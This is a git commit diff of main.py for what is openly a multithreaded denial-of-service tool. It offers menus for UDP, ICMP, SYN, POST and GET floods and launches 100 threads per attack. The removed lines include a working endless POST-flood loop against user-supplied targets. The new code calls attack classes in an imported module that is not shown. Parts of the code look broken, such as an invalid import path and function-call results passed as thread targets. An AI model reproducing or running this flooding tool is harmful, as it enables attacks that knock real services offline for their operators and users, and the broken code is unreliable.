c31bbd7972aaa064105d70c26d1a1d87df8628be
Riccardo <134144784+riccio8@users.noreply.github.com>
2024-08-04 16:39:55 +0200

    Update main.py

--- main.py
+++ main.py
@@ -3,35 +3,12 @@ import threading as th
 import time
 import sys
 import os
-import lib/attack_type as ty
+import test_lib as ty
 
 choices = [1, 2, 3]
 Threads = []
 
 
-def udp_flooding(i):
-    print("first choice")
-
-def ICMP(i):
-    pass
-
-def Syn_flood(i):
-    pass
-
-def pof(i):
-    pass
-
-def Post(i):
-    print("using post method to: ", vector)
-    print("u have 10 second to end the attack, press ctrl+c or ctrl+z")
-    time.sleep(10)
-    while True:
-        for target in vector:
-            response = res.post(target, data=bye, json=None)
-            print(response.text)
-
-def Get(i):
-    pass
 
 try:
     attack_type = int(input("choose a type of attack: \n volume based attack(1), protocol attack(2), application layer attack(3)\n")) #type of attack
@@ -39,39 +16,50 @@ try:
     bye = input("number of bytes: \n").encode() #packet size
 
     if attack_type == choices[0]:
+        volumeBaseAttack = ty.VolumeBasedAttack
         subtype0 = int(input("udp_flooding(1) or ICMP(2)\n"))
+        
         if subtype0 == 1:
+            udp_floo = volumeBaseAttack.udp_flooding(vector, bye)
             for i in range(100):
-                t = th.Thread(target=udp_flooding, args=(i,))
+                t = th.Thread(target=udp_floo, args=(i,))
                 Threads.append(t)
                 t.start()
         else:
+            ICMP = volumeBaseAttack.icmp(vector, bye)
             for i in range(100):
                 t = th.Thread(target=ICMP, args=(i,))
                 Threads.append(t)
                 t.start()
 
     elif attack_type == choices[1]:
+        protocolAttack = ty.ProtocolAttack
         subtype1 = int(input("Syn_flood(1) or pof(2)\n"))
         if subtype1 == 1:
+            Syn_flood = protocolAttack.syn_flood(vector, bye)
             for i in range(100):
                 t = th.Thread(target=Syn_flood, args=(i,))
                 Threads.append(t)
                 t.start()
         else:
+            pof = protocolAttack.pof(vector, bye)
             for i in range(100):
                 t = th.Thread(target=pof, args=(i,))
                 Threads.append(t)
                 t.start()
 
     elif attack_type == choices[2]:
+        applicationLayerAttack = ty.ApplicationLayerAttack
         subtype2 = int(input("Post(1) or Get(2)\n"))
         if subtype2 == 1:
+            Post = applicationLayerAttack.post(vector, bye)
             for i in range(100):
                 t = th.Thread(target=Post, args=(i,))
                 Threads.append(t)
                 t.start()
+                print("using post method to: ", vector)
         else:
+            Get = applicationLayerAttack.get(vector, bye)
             for i in range(100):
                 t = th.Thread(target=Get, args=(i,))
                 Threads.append(t)
